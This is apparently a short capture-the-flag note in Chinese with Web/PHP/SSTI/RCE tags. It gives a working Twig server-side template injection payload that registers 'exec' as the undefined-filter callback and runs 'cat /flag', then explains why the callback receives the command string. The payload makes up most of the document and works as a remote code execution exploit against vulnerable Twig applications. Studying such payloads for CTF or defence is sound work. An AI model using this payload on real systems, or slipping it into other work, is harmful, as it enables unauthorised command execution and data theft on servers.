```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```
这个看字面意思好像是先注册一个回调，当获取一个未定义的过滤器时候调用这个回调，并向它传递试图获取的过滤器名字，所以最终就变成了向`exec`传递`cat /flag`，也就获取到了`flag`
#Web #PHP #SSTI #RCE #twig